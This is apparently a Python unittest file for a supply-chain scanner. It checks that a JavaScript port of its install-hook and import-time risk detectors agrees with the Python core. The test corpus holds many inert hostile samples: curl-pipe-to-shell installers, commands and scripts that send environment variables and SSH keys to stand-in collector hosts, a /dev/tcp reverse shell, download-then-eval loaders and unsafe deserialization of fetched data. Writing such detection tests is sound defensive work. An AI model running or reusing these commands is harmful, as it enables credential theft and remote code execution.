"""Engine parity for following install hooks and the install-script and
import-time tests: the npm engine's js/src/lib/hooks.js against
lazaret.scanner.core (follow_hook, install_script_risk,
import_time_risk, node_candidates, shebang_lang, and what they rest on:
_hook_tokens, a shlex tokenizer with a regex fallback, and the `node -e`
pattern).

The JS module re-implements Python's shlex (posix, punctuation_chars,
whitespace_split, no commenters: read_token is the same in CPython 3.10 to
3.14) and compiles core's patterns with Python `re` semantics, so the two
must agree on every input. They are compared case by case, in one node
process, on realistic hook commands and scripts and on a seeded random
corpus built from pieces the functions look at: quotes, backslashes,
operators and redirections, cd, wrappers, interpreters, node flags,
require() calls, download commands, credential and exfiltration markers,
non-ASCII letters (é; ſ and the Kelvin sign, which re.I folds to s and k;
İ and ı), Python-only whitespace (U+001C, U+0085). Each function's result
is compared, and shlex's own tokens (None where it raises) apart from the
fallback. The JS module's copies of core's pattern text and name sets are
compared with core's too.

Characters are those of Unicode 13.0, which the scanner pins source text
to: for a later one (a digit Unicode 14 added, say) core's own answer
depends on the Python version.

All text is inert: hosts are .invalid, TEST-NET or private addresses, and
nothing is executed. Skipped where node is missing.
"""
import collections
import json
import os
import random
import re
import shlex
import shutil
import subprocess
import unittest

from lazaret.scanner import core
from tests import _support

NODE = shutil.which("node")
HOOKS_JS = os.path.join(_support.REPO_ROOT, "js", "src", "lib", "hooks.js")
NPM_HOOKS = """
import { readFileSync } from "node:fs";
import { pathToFileURL } from "node:url";
const h = await import(pathToFileURL(process.argv[1]).href);
const cases = JSON.parse(readFileSync(0, "utf8"));
const results = cases.map((s) => [h.shlexSplit(s), h.hookTokens(s), h.followHook(s),
  h.installScriptRisk(s), h.importTimeRisk(s), h.nodeCandidates(s), h.nodeECodes(s), h.shebangLang(s)]);
process.stdout.write(JSON.stringify({ twins: h.PY_TWINS, results }));
"""
FIELDS = ("shlex tokens", "_hook_tokens", "follow_hook", "install_script_risk", "import_time_risk",
          "node_candidates", "_NODE_E_RE codes", "shebang_lang")

# Realistic hook commands and install / import-time scripts
CURATED = [
    "node install.js", "node ./scripts/x.mjs", "node install", "node --no-warnings x.js",
    "node -r ./preload.js x.js", "node --require=./preload.cjs --import ./loader.mjs x.js",
    "node --title x y.js", "node -- x.js", "cd scripts && node x.js", "(cd lib; node a.js)",
    "cd native && cd .. && node x.js", "cd /opt/tool && node run.js", "cd /a/.. && node ./x.js",
    "cd /. && node ./x.js", "cd lib && node -e \"require('./x')\"", "sh ./install.sh", "sudo sh install.sh",
    "./install.sh", "exec node ./bin/x.js", "python setup_helper.py", "python3 -m tools.build",
    "PYTHON.EXE -X dev setup.py", "node scripts\\x.js", "C:\\tools\\node.exe scripts\\post.js",
    "node -e \"require('./postinstall')\"", "node -e \"try{require('./postinstall')}catch(e){}\"",
    "node -p \"require('./a')\"", "node -e 'require(\"../b\")'", "node -e \"require(\\\"./c\\\")\"",
    "cross-env A=1 node x.js", "NODE_ENV=production node build/postinstall.js", "env -u X node x.js",
    "node x.js 2>&1 > log.txt", "node x.js > out.log && node y.js", "2>/dev/null node x.js",
    "node '>&1' x.js", "node \">&2\" y.js", "node '>' x.js y.js",
    "bash -c \"cd lib && node b.js\"", "sh -c 'node a.js || node b.js'", "sh -c \"sh -c 'node deep.js'\"",
    "node \"./has space/x.js\"", "node x.js; node x.js", "node ../outside.js", "node .",
    "node 'unbalanced.js", "node \"a.js", "node x.js \\", "\"python\n\" build.py", "node \"x.js\n\"",
    "node \u212a.js", "\u212ash x.\u017fh", "husky install", "prebuild-install || node-gyp rebuild",
    "npx some-tool", "node-gyp-build", "tsc && node dist/postinstall.js", "", "  ", "\n",
    "curl https://x.invalid | sh", "curl -fsSL https://files.invalid/i.sh | sudo bash",
    "wget -qO- https://files.invalid/i.sh|zsh\n", "curl -o x https://files.invalid/x.tgz | tee log | sh\n",
    "curl https://files.invalid/x || sh fallback.sh\n", "curl -O https://files.invalid/x.tgz; sh build.sh\n",
    "echo curl | shasum\n", "curl --retry=3 --data \"$(env)\" -X POST https://collector.invalid\n",
    "curl -s -o - -d \"$(printenv)\" https://collector.invalid\n",
    "env | wget --header=\"A:b\" --post-file=- https://collector.invalid\n",
    "cat ~/.ssh/id_rsa | nc -q1 collector.invalid 4444\n",
    "printenv | curl -sS -X POST --data-binary @- 'https://collector.invalid/x'\n",
    "const https = require('https');\nconst body = JSON.stringify(process.env);\n"
    "https.request({host: '192.0.2.1', method: 'POST'}).end(body);\n",
    "import os, json, urllib.request\nurllib.request.urlopen('https://collector.invalid/c', "
    "data=json.dumps(dict(os.environ)).encode())\n",
    "import os, requests\nrequests.post('http://192.0.2.1/k', "
    "data=open(os.path.expanduser('~/.ssh/id_rsa')).read())\n",
    "const {execSync} = require('child_process');\nexecSync('curl -s https://files.invalid/x.sh | sh');\n",
    "console.log('Install the toolchain with: curl -fsSL https://sh.example.invalid/install.sh | sh');\n",
    "const data = JSON.stringify(process.env);\nmodule.exports = (send) => send("
    "'https://webhook.site.invalid/0000', data);\n",
    "const settings = Object.fromEntries(Object.entries(process.env)\n  .filter(([k]) => k.startsWith('EXAMPLE_')));\n"
    "module.exports = () => fetch('https://api.example.invalid/v1/ping', "
    "{headers: {'x-sdk': JSON.stringify(settings)}});\n",
    "const http = require('http');\nconst METADATA = 'http://169.254.169.254/latest/meta-data/iam/';\n"
    "module.exports = (cb) => http.get(METADATA, cb);\n",
    "const fs = require('fs'), os = require('os'), path = require('path');\nconst https = require('https');\n"
    "const key = fs.readFileSync(path.join(os.homedir(), '.ssh/id_ed25519.pub'));\n"
    "https.request({host: 'deploy.example.invalid', method: 'PUT'}).end(key);\n",
    "import os, subprocess, urllib.request\n\ndef build(cmd):\n    env = os.environ.copy()\n"
    "    return subprocess.run(cmd, env=env, check=True)\n\ndef fetch(url, dest):\n"
    "    urllib.request.urlretrieve(url, dest)\n",
    "const p = 'Local Storage/leveldb';\nfetch('https://collector.invalid');\n",
    "const p = 'LOCAL STORAGE\\\\leveldb';\nfetch('https://collector.invalid');\n",
    "const p = 'Local Storage/LEVELDB';\nfetch('https://collector.invalid');\n",
    "// curl is great; see https://curl.se\nconst env = Object.keys(process.env);\n",
    "var nc = 1;\nconst body = JSON.stringify(process.env);\n", "env || true\ncurl -O https://files.invalid/x.tgz\n",
    "fetch('http://192.0.2.1/x')\n", "HTTP://10.0.0.1:8080/", "ba\u017fe https://pastebin.com.invalid/raw/x",
    "exec(\"bash -i >& /dev/tcp/192.0.2.1/4444 0>&1\")\n", "{**os.environ}\nimport httpx\n",
    "curl " + "--a-b " * 25 + "x", "curl -a " * 200 + "https://files.invalid", "| sh " * 50,
    # wrappers and their options, fd numbers, node -e in a directory, the limits
    "sudo -u me node x.js", "sudo -E -H node x.js", "sudo -D sub node x.js", "sudo --chdir=sub node x.js",
    "env -i node x.js", "env - node x.js", "env -u X node x.js", "env -uX node x.js", "env --unset=X node x.js",
    "env -C sub node x.js", "env -Csub node x.js", "env --chdir sub node x.js", "cd a && env -C ../b node x.js",
    "env -C ~ node x.js", "env -S \"node x.js\"", "env -S'node -r ./p.js x.js'", "env --split-string='node y.js'",
    "env -S 'cd lib && node z.js'", "nice -n 5 node x.js", "nice -10 node x.js", "time -o f.txt node x.js",
    "time -p node x.js", "exec -a name node x.js", "dotenv -e .env -- node x.js", "dotenv -v A=1 node x.js",
    "command -p node x.js", "nohup node x.js &", "sudo -u me env -C sub A=1 node x.js", "sudo -- node x.js",
    "1>out node x.js", "2>&1 node x.js", "node x.js 2> err.log", "node x.js 2>&1 3>&- 4<in",
    "echo 5 > f; node x.js", "node -e \"require('./a')\" && cd lib && node --eval=\"require('./b')\"",
    "cd lib && node -p \"require('../c')\"", "npx node -e \"require('./d')\"",
    "cd a;" * 1200 + "node x.js", "node x.js;" * 1200, " ".join(f"node s{n}.js" for n in range(150)).replace(" node", "; node"),
    "node " + "a" * 4100 + ".js", "cd " + "a" * 4095 + " && node x.js", "x" * 100_001, "\U0001F600" * 50_001,
    "node " + "\U0001F600" * 99_990,
    # #! lines
    "#!/usr/bin/env node\n", "#!/usr/bin/node --harmony\nx", "#! /usr/bin/env -S deno run --allow-all\n",
    "#!/usr/bin/env bun", "#!/usr/local/bin/ts-node", "#!/usr/bin/env tsx\r\n", "#!/usr/bin/python3.11 -u\n",
    "#!/usr/bin/env PYTHON3", "#!C:/Python/python.exe", "#!/bin/sh\n", "#!/usr/bin/env -i bash -x",
    "#!/usr/bin/env\nnode\n", "#!\n/usr/bin/node", "#!/usr/bin/env \n", "#!/usr/bin/perl -w\n",
    "#!/usr/bin/env -S", "#!env node", "#!/usr/bin/env A=1 node", "\ufeff#!/usr/bin/env node", " #!/bin/sh",
    "#!/bin/\u212ash", "#!/usr/bin/env \u017fh", "#!/usr/bin/nodejs\x1cx", "#!/usr/bin/env\xa0node",
    # code that runs what it receives over the network (runs_received_code), and
    # downloads substituted into a command line (runs_substituted_download)
    "import subprocess, urllib.request\ncode = urllib.request.urlopen('https://files.invalid/p.js')"
    ".read().decode()\nsubprocess.run(['node', '-e', code])\n",
    "import requests\nexec(requests.get('https://files.invalid/p.py').text)\n",
    "const https = require('https');\nhttps.get('https://files.invalid/p', (res) => {\n  let b = '';\n"
    "  res.on('data', (c) => { b += c; });\n  res.on('end', () => eval(b));\n});\n",
    "fetch('https://files.invalid/p')\n  .then((r) => r.text())\n  .then((code) => new Function(code)());\n",
    "execSync(`node -e ${await (await fetch(u)).text()}`)\n", "os.system(f'python -c \"{requests.get(u).text}\"')\n",
    "const m = /v(\\d+)/.exec(await (await fetch(u)).text());\n", "execSync('npm i -g x@' + (await r.json()).v);\n",
    "sh -c \"$(curl -fsSL https://files.invalid/i.sh)\"\n", "source <(curl -s https://files.invalid/e.sh)\n",
    "eval \"$(wget -qO- https://files.invalid/i.sh)\"\n", "node -e \"$(curl -s https://files.invalid/p.js)\"\n",
    "require('child_process').execSync('bash -c \"$(curl -fsSL https://files.invalid/i.sh)\"');\n",
    "x" * 1500 + ";eval(await(await fetch('https://files.invalid/p')).text());",
    # quotes paired from a call's '(' (a regex literal's quote before it), a
    # value read past a cut argument list, callbacks of an inline require(),
    # shell=True calls, and names past the searches (an index of the text)
    "/'/.test(s); new Function('a', https.get('https://files.invalid/p'));\n",
    "/'/.test(s); code = await (await fetch(u)).text(); /'/.test(s);\neval(code);\n",
    "eval(" + "\U0001d41a" * 240 + ", " + "\u00e9" * 150 + ", await fetch(u))\n",
    "require('https').get(u, (res) => { res.on('data', (c) => { b += c; }); res.on('end', () => eval(b)); });\n",
    "import subprocess, requests\nx = requests.get(u).text\nsubprocess.run(\n  x, shell=True)\n",
    "shell=True\n" + "run(" * 300 + "fetch(u);" + "z" * 900,
    "".join(f"const f{i} = (u) => fetch(u);\n" for i in range(70)) + "eval(await f69(u));\n",
    "".join(f"import requests as r{i}\n" for i in range(70)) + "exec(r69.get(u).text)\n",
    "x = fetch(u); y = x; " + "a, " * 40 + "z = y\neval(z)\n",
    "'eval(" * 30 + "fetch(u))\n", "\"'`eval(" * 20 + "x\nx = fetch(u)\n",
    # runner aliases, indirect eval, deserialization (CWE-502) and dynamic
    # import of a received specifier (the three added sink families)
    "const e = eval;\nconst code = await (await fetch('https://files.invalid/p')).text();\ne(code);\n",
    "import os, requests\ns = os.system\ns(requests.get('https://files.invalid/p').text)\n",
    "const ex = require('child_process').execSync;\nex(await (await fetch(u)).text());\n",
    "const code = await (await fetch(u)).text();\n(0, eval)(code);\n",
    "const code = await (await fetch(u)).text();\neval.call(null, code);\n",
    "const code = await (await fetch(u)).text();\nwindow['eval'](code);\n",
    "import pickle, requests\npickle.loads(requests.get('https://files.invalid/p').content)\n",
    "import marshal, urllib.request\nmarshal.loads(urllib.request.urlopen(u).read())\n",
    "import yaml, requests\nyaml.load(requests.get(u).text)\n",
    "import yaml, requests\nyaml.load(requests.get(u).text, Loader=yaml.SafeLoader)\n",   # data-only: not it
    "const s = require('node-serialize');\ns.unserialize(await (await fetch(u)).text());\n",
    "const name = await (await fetch('https://files.invalid/p')).text();\nawait import(name);\n",
    "const name = await (await fetch(u)).text();\nrequire(name);\n",
    "import importlib, requests\nimportlib.import_module(requests.get(u).text)\n",
    "import requests\n__import__(requests.get(u).text)\n",
    "const e = eval; e(JSON.parse(x));\n",                    # alias, but no received value: not it
    "x = os.system\nx('ls -la')\n",                            # alias of a fixed command: not it
    # download to a file, then run the file (import-time MAJOR only)
    "import requests, subprocess, sys\ndata = requests.get('https://files.invalid/p').content\n"
    "open('x.py', 'wb').write(data)\nsubprocess.run([sys.executable, 'x.py'])\n",
    "const body = await (await fetch('https://files.invalid/p')).text();\nfs.writeFileSync('m.js', body);\nrequire('./m.js');\n",
    "import urllib.request, subprocess\nurllib.request.urlretrieve('http://x.invalid/t', 'tool.py')\n"
    "subprocess.run(['python', 'tool.py'])\n",
    "const https = require('https');\nhttps.get('https://files.invalid/p', (r) => r.pipe(fs.createWriteStream(dst)));\n"
    "fork(dst);\n",
    "const body = await (await fetch(u)).text();\nfs.writeFileSync('cache.json', body);\n",   # written, not run: not it
    "fs.writeFileSync('x.js', localData);\nrequire('./x.js');\n",                              # no download: not it
]

# The pieces random cases are made of. MIXED reaches every function; the
# others are dense in one mechanism, so that its rarer paths come up often.
MIXED = [
    " ", " ", "  ", "\t", "\n", "\r", "\r\n", "'", "'", "'", '"', '"', '"', "\\", "\\", "\\", "\\\\",
    "&", "|", ";", "(", ")", "<", ">", "&&", "||", ";;", ">>", ">&", "&>", "2>&1", "<<", ">|", "|&",
    "=", "$", "-", "--", "0", "1", "2", "9", "a", "b", "x", "/", ".", "..", "~",
    "node", "nodejs", "node.exe", "NODE", "sh", "bash", "zsh", "sh.exe", "python", "python3", "python3.11",
    "py", "PYTHON.EXE", "cd", "pushd", "env", "cross-env", "sudo", "exec", "A=1", "NODE_ENV=production",
    "-e", "-p", "--eval", "-r", "--require", "--import", "--loader=", "-c", "-m", "-O", "-X", "--no-warnings",
    "./x.js", "../y", "x.js", "a.mjs", "b.cjs", "s.sh", "p.py", "install", "scripts\\a.js", "scripts/",
    "/abs/z.js", "$HOME", "~/d", "pkg.mod",
    "require('./p')", 'require("../q")', "require(\\'./r\\')", "require( './s' )", "try{", "}catch(e){}",
    "curl", "wget", "https://", "http://", "http://10.0.0.1", "10.0.0.1", "| sh", "|bash", "| sudo sh",
    "|zsh", "| tee", "process.env", "JSON.stringify(process.env)", "JSON.stringify(process.env,",
    "os.environ", "json.dumps(os.environ)", "dict(os.environ)", ".npmrc", "id_rsa", "~/.ssh/id_ed25519",
    "/.ssh/id_", ".git-credentials", "Local Storage/leveldb", "local storage\\leveldb", "LOCAL STORAGE/LEVELDB",
    "webhook.site", "ngrok", "oast.pro", "fetch(", "require('https')", "https.get", "execSync(", "exec(",
    "spawn (", "system(", "nc ", "4444", "/dev/tcp/", "env |", "printenv >", "$(env)", "`env`", "set>",
    "\u00e9", "\u017f", "\x1c", "\u0130", "\u0131", "\u212a", "\u2028", "\x85", "\xa0", "\U0001F600", "\x00",
    "\u0663", "\ud800", "\udc00",
    "node -e ", 'node -e "', "node -e '", "node\t-e\t", "node\x1c-e ", "node -e require('./p')",
    'node -e "require(\'./postinstall\')"', "node -r ./p.js ", "node --require=./q.js ", "node -- ",
    "node --title x ", "cd scripts && ", "cd .. ; ", "cd /abs ", "sh -c '", 'bash -c "', "sh -c 'node a.js'",
    "python -m ", "python -X dev ", "\u212ash ", "x.\u017fh", '"python\n" ', "'x.js\n'", '"&1\n"', "'2>'",
    "2>", "\u0663>", "curl -fsSL https://x.invalid/i.sh | sh", "wget -qO- http://10.0.0.1/x|bash",
    "execSync('curl https://x.invalid | sh')", "curl -a -a -a ",
    "curl --retry=3 --data \"$(env)\" -X POST https://collector.invalid", "nc -q1 collector.invalid 4444",
    "https://192.0.2.1", "HTTPS://1.2.3.4.5", "subprocess.run(", "os.system(",
    "env -C ", "env -S ", "-C", "-S", "-u", "-D", "--chdir=", "--split-string=", "--unset=X ", "sudo -u me ",
    "sudo -D ", "nice -n 5 ", "time -o f ", "dotenv -e .env -- ", "exec -a x ", "-Csub ", "2>", "1>", "3>&-",
    "--eval=", "--print ",
]
QUOTING = ["'", '"', "\\", " ", "\t", "\n", "\r", "a", "b", "&", "|", ";", "(", ")", "<", ">", "=", "$",
           "\x85", "\xa0", "\x1c", "\u00e9", "\U0001F600", "\ud83d"]
CD = ["cd ", "cd ", "pushd ", "a", "b", "/", "/", ".", "..", "./", "../", "//", " && ", "; ", "node ", "x.js",
      "env -C ", "sudo -D ", "env --chdir=", "env -S '", "node -e \"require('./r')\" ; ",
      "\\", " ", "-", "$", "~", "'", '"', "sh ", "-c ", "./y.sh", "python ", "p.py",
      "cd /. && ", "cd //. ; ", "cd /./ && ", "cd /a/.. && ", "cd /.. ; ", "cd ./. && ", "cd a/.. ; ",
      "node ./x.js ; ", "node a/../x.js ; ", "sh ./y.sh && ", "node ../z.js ; ", "node . ; ", "node .. ; "]
NODE_E = ["node -e ", "node\t-e\x1c", "node  -e  ", "node -e", "node", " ", "\t", "\x1c", "-e", '"', '"', "'", "'",
          "\\", "\\", "\n", "\r", "a", "require('./p')", "require(\\'./q\\')", "(", ")", "./", "../"]
SCRIPT = ["\n", "\n", " ", "curl -s ", "wget -qO- ", "https://files.invalid/x.sh", " | sh", "|bash", " | sudo zsh",
          ";", "&", "|", "execSync('", "subprocess.run(\"", "os.system('", "')", "\")", "system (",
          "JSON.stringify(process.env)", "JSON.stringify(process.env, null)", "json.dumps(dict(os.environ))",
          "str(os.environ)", "urlencode(os.environ)", "~/.ssh/id_rsa", "/.ssh/id_ed25519.pub", "id_dsa",
          ".git-credentials", "Local Storage/leveldb", "LOCAL STORAGE\\leveldb", "local storage/LEVELDB",
          "fetch(", "require('https')", "from 'node:net'", "import requests", "socket.socket(", "nc ",
          "192.0.2.1 4444", "/dev/tcp/", "https://192.0.2.1", "webhook.site", "\u0131nteract.sh", "api.telegram.org",
          "x.onion", "env | ", "printenv > ", "$(env)", "Object.keys(process.env)", ".npmrc", "\u017f", "\u212a",
          "execSync('curl -s https://files.invalid/x.sh | sh')",
          "subprocess.run(\"wget -qO- https://files.invalid/x|bash\")"]
RECEIVED = ["\n", "\n", "\n", " ", ";", "(", ")", "=", "'", '"', "`", "\\", "\t", "{", "}", ",",
            "code", "body", "r", "res", "c", "data", "\u00e9", "\U0001d41a", "rq", "load",
            "const code = ", "let body = '';", "code = ", "body += c;", "r = ", "{ data } = ", "code: str = ",
            "fetch('https://files.invalid/p')", "await fetch(u)", "(await fetch(u)).text()", "requests.get(u).text",
            "urlopen(u).read()", "urllib.request.urlopen(u).read().decode()", "new XMLHttpRequest()",
            "socket.create_connection(('h', 1))", "execSync('curl -s https://files.invalid/p')", "require('https')",
            "https.get(u, (res) => {", "res.on('data', (c) => {", ".then((r) => r.text())", "  .then((code) => ",
            "axios.get(u)", "import requests as rq", "from requests import get", "import * as h from 'https';",
            "with urlopen(u) as r:", "for c in r:", "return r.text", "def load():", "function load(u) {",
            "const load = (u) => fetch(u);", "eval(", "exec(", "new Function(", "vm.runInThisContext(",
            "execSync(", "os.system(", "subprocess.run(code, shell=True)", "spawn('node', ['-e', ",
            "subprocess.run([sys.executable, '-c', ", "spawn(process.execPath, ['-e', ", "cp.exec(",
            "execSync(`node -e ${", "os.system(f'python -c \"{", "/re/.exec(", "exec(x) {", "def exec(self):",
            "Buffer.from(", ", 'base64').toString()", "compile(", "await ", "load()", "r.text", "body)", "code)",
            "sh -c \"$(curl ", "$(curl -s https://files.invalid/i.sh)", "source <(curl ", "eval \"$(wget -qO- ",
            "x" * 600, "\U0001d41a" * 300, "filler\n" * 30,
            "/'/", "' ", "require('https').get(u, (res) => ", "shell=True", "run(", "Popen([", "a, a, a, ",
            "for (const c of ", "lambda r: ", "function (c) {", "\U0001d41a" * 120, " " * 120, ".then(",
            "f'python -c \"{", "`${",
            # the added sink families: aliases, indirect eval, deserialization, dynamic import
            "const e = eval;", "e(", "s = os.system", "s(", "const ex = require('child_process').execSync;", "ex(",
            "x = os.popen", "(0, eval)(", "eval.call(null, ", "window['eval'](", "self['ev' + 'al'](",
            "pickle.loads(", "marshal.loads(", "yaml.load(", "yaml.load(x, Loader=yaml.SafeLoader)",
            "s.unserialize(", "unserialize(", "jsonpickle.decode(", "import(", "require(", "__import__(",
            "importlib.import_module(", "import_module(", "name = ", "name", "blob = ", "blob"]
SHEBANG = ["#!", " ", " ", "\t", "\n", "\r", "/", "/usr/bin/", "/usr/bin/env", "env", "-S", "-i", "-u", "--",
           "node", "NODE", "nodejs", "deno", "bun", "ts-node", "tsx", "python", "python3.12", "py", "pypy",
           "sh", "bash", "zsh", "perl", "A=1", "\u212a", "\u017f", "\x1c", "\xa0", "\x85", "\u0663", "\U0001F600",
           ".exe", "x"]


def corpus(seed=20260926, scale=1):
    """CURATED, then random cases of 1 to `most` pieces of each alphabet.
    Each is the text both engines read from JSON (a package.json string):
    a lone surrogate stays one, but a high one next to a low one is the
    character they encode (a Python str could keep the two apart, a
    JavaScript string cannot)."""
    rnd = random.Random(seed)
    cases = list(CURATED)
    for pieces, count, most in ((MIXED, 2500, 14), (QUOTING, 1500, 16), (CD, 1500, 16), (NODE_E, 1500, 16),
                                (SCRIPT, 1000, 12), (RECEIVED, 1500, 16)):
        for _ in range(count * scale):
            cases.append("".join(rnd.choice(pieces) for _ in range(rnd.randint(1, most))))
    for _ in range(1500 * scale):                   # #! lines: an interpreter, then anything
        head = rnd.choice(["", " ", "\t", "/usr/bin/", "/usr/bin/env ", "/usr/bin/env -S ", "env\t", "/bin/", "\n"])
        name = rnd.choice(["node", "NODE", "nodejs", "deno", "bun", "ts-node", "tsx", "python", "python3.12", "PY",
                           "pypy", "sh", "bash", "zsh", "perl", "env", "\u212ash", "\u017fh", "x"])
        after = rnd.choice(["", " ", "\t", "\n", "\r\n", "\x1c", "\xa0", "/"])
        cases.append("#!" + head + name + after + "".join(rnd.choice(SHEBANG) for _ in range(rnd.randint(0, 6))))
    return [json.loads(json.dumps(text)) for text in cases]


def shlex_tokens(cmd):
    """_hook_tokens' shlex reading of cmd, or None where shlex raises."""
    try:
        lex = shlex.shlex(cmd, posix=True, punctuation_chars=True)
        lex.whitespace_split = True
        lex.commenters = ""
        return list(lex)
    except ValueError:
        return None


def core_view(text):
    """core's answers for one case, in FIELDS order (as JSON would carry them)."""
    reasons, line = core.import_time_risk(text)
    return [shlex_tokens(text), core._hook_tokens(text), list(core.follow_hook(text)),
            core.install_script_risk(text), [reasons, line], core.node_candidates(text),
            [next(g for g in m.groups() if g is not None) for m in core._NODE_E_RE.finditer(text)],
            core.shebang_lang(text)]


def run_npm(cases):
    """(PY_TWINS, [results per case]) from js/src/lib/hooks.js."""
    p = subprocess.run([NODE, "--input-type=module", "-e", NPM_HOOKS, HOOKS_JS], input=json.dumps(cases),
                       capture_output=True, encoding="utf-8", errors="replace", timeout=60)
    if p.returncode:
        raise AssertionError(f"node exited {p.returncode}: {p.stderr[-2000:]}")
    out = json.loads(p.stdout)
    return out["twins"], out["results"]


def mismatches(cases, views, results, limit=20):
    """[(case, field, core's, npm's)] for the first `limit` differences."""
    found = []
    for text, view, got in zip(cases, views, results):
        for field, want, have in zip(FIELDS, view, got):
            if want != have:
                found.append((text, field, want, have))
                if len(found) >= limit:
                    return found
    return found


@unittest.skipUnless(NODE, "node is not installed")
class HookParityTests(unittest.TestCase):
    maxDiff = None

    @classmethod
    def setUpClass(cls):
        cls.cases = corpus()
        cls.views = [core_view(text) for text in cls.cases]
        cls.twins, cls.results = run_npm(cls.cases)

    def test_every_case_agrees(self):
        self.assertEqual(len(self.results), len(self.cases))
        self.assertTrue(all(len(r) == len(FIELDS) for r in self.results))
        self.assertEqual(mismatches(self.cases, self.views, self.results), [])

    def test_the_corpus_reaches_every_path(self):
        """Guards the comparison against a corpus that stopped exercising
        something: each count is well above zero for this seed."""
        counts = collections.Counter()
        for tokens, _, (targets, complete), install, (on_import, _), _, codes, lang in self.views:
            counts["shlex raises"] += tokens is None
            if lang:
                counts[f"#! {lang}"] += 1
            counts["targets"] += bool(targets)
            counts["not followed completely"] += not complete
            counts["node -e codes"] += bool(codes)
            for reason in install + on_import:
                counts[reason.split(" (")[0]] += 1          # (the exfiltration reason names the address)
        self.assertEqual(len(counts), 16, counts)           # 4 install-script reasons and 6 import-time ones (two of
                                                            # them the same text: run, deserialize, import, download-run), 3 #! languages
        # these reasons are rarer in the random stream but present (curated) and well above zero
        rare = {"not followed completely", "deserializes data it receives over the network",
                "loads a module named by data it receives over the network", "downloads a file and then runs it"}
        self.assertEqual({k: n for k, n in counts.items() if n < 100 and k not in rare}, {}, counts)
        self.assertGreaterEqual(counts["not followed completely"], 7, counts)   # the curated limit cases
        self.assertGreaterEqual(counts["deserializes data it receives over the network"], 25, counts)
        self.assertGreaterEqual(counts["loads a module named by data it receives over the network"], 25, counts)
        self.assertGreaterEqual(counts["downloads a file and then runs it"], 4, counts)

    def test_pattern_text_and_names_are_cores(self):
        """The JS module carries core's pattern text verbatim, with the same
        flags, and the same name sets (flags: i = re.I, m = re.M)."""
        for name, (src, flags) in self.twins["patterns"].items():
            with self.subTest(pattern=name):
                rx = getattr(core, name)
                self.assertEqual(src, rx.pattern)
                self.assertEqual(flags, ("i" if rx.flags & re.I else "") + ("m" if rx.flags & re.M else ""))
                self.assertFalse(rx.flags & re.S)
        for name, names in self.twins["sets"].items():
            with self.subTest(names=name):
                self.assertEqual(sorted(names), sorted(getattr(core, name)))
        for name, table in self.twins["maps"].items():
            with self.subTest(options=name):
                self.assertEqual(table, {k: sorted(v) for k, v in getattr(core, name).items()})
        self.assertEqual(self.twins["limits"], {k: getattr(core, k) for k in
                                                ("HOOK_MAX_CHARS", "HOOK_MAX_COMMANDS", "HOOK_MAX_TARGETS", "HOOK_MAX_PATH",
                                                 "_DL_LONG_ROW", "_DL_WINDOW", "_DL_ARG_SPAN", "_DL_LOOKBACK",
                                                 "_DL_NAMED_SEARCHES", "_DL_PHASES", "_DL_ALIAS_MAX")})
        self.assertEqual(len(self.twins["patterns"]), 57)
        self.assertEqual(len(self.twins["sets"]), 23)
        self.assertEqual(len(self.twins["maps"]), 3)

if __name__ == "__main__":
    unittest.main()
